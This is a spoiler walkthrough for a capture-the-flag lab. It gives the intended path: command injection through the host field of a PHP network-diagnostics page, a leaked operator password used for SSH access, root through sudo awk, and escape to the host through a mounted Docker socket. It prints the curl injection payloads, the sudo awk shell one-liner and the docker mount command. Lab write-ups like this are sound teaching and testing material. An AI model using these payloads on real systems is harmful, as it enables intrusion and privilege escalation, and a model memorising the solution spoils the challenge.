# Walkthrough (spoiler)

This is the intended solution path. It is a spoiler for maintainers and for
verifying the challenge. Do not read it if you want to play.

Target ports (default mapping): 8080 web, 22 outer-host SSH, 23 web-container
SSH.

## Stage 0 - Recon

- Browse `http://TARGET:8080/`. The NetDiag console posts a `host` and a `tool`
  to `diag.php`.
- `http://TARGET:8080/robots.txt` and the HTML comment on the index note that
  `diag.php` shells out to ping/nslookup/whois and that the host field is not
  escaped.

## Stage 1 - OS command injection

- `diag.php` builds `<tool> <host> 2>&1` and passes it to `shell_exec` with no
  validation. The `host` field is injectable.
- Confirm with a shell metacharacter:

  ```bash
  curl -s -X POST http://TARGET:8080/diag.php \
    --data-urlencode 'tool=ping' --data-urlencode 'host=127.0.0.1; id'
  ```

- The response includes `uid=33(www-data)`, confirming command execution as the
  web user.

## Stage 2 - First inner flag (www-data)

- The injection is a usable web shell. Read the flag owned by `www-data`:

  ```bash
  curl -s -X POST http://TARGET:8080/diag.php \
    --data-urlencode 'tool=ping' --data-urlencode 'host=; cat /var/www/user_flag.txt'
  ```

- That prints the first `FLAG{...}`.

## Stage 3 - Recover a credential, pivot to diag (inner SSH)

- Enumerate as `www-data`. The application config is world-readable:

  ```bash
  curl -s -X POST http://TARGET:8080/diag.php \
    --data-urlencode 'tool=ping' --data-urlencode 'host=; cat /opt/netdiag/scheduler.conf'
  ```

- It leaks the diagnostics operator credential (`diag` and its password). The
  web container's SSH is published on port 23:

  ```bash
  ssh diag@TARGET -p 23
  cat ~/diag.txt
  ```

- That gives the second `FLAG{...}`.

## Stage 4 - diag to inner root (sudo awk, GTFOBins)

- `sudo -l` shows `diag` may run `/usr/bin/awk` as root with NOPASSWD.
- Spawn a root shell (GTFOBins):

  ```bash
  sudo awk 'BEGIN{system("/bin/bash")}'
  cat /root/root.txt
  ```

- That gives the inner root flag, `SHELL_FLAG{...}`.

## Stage 5 - Break out to the outer host (both MAIN_FLAG)

- As root in the web container, note `/var/run/docker.sock` is mounted and a
  static `docker` client is present.
- Read the outer root flag by mounting the outer host filesystem:

  ```bash
  docker run --rm -v /:/host alpine cat /host/root/root.txt
  ```

  That prints the outer `MAIN_FLAG{...}` root flag.

- The deploy notes readable only by inner root leak the outer host account:

  ```bash
  cat /root/deploy-notes.txt
  ```

  Log in over the outer-host SSH port as `netops` and read the user flag:

  ```bash
  ssh netops@TARGET -p 22
  cat ~/user.txt
  ```

  That prints the outer `MAIN_FLAG{...}` user flag.

## Notes and red herrings

- `nslookup` and `whois` are equally injectable; `ping` is just the default
  option. In an unprivileged container `ping` itself may fail to open a raw
  socket, but the injected command after `;` still runs.
- The outer root flag is also readable directly through the Docker socket mount
  (the host filesystem is mounted as root), so the `netops` credential is the
  intended, but not the only, route to the outer user flag.
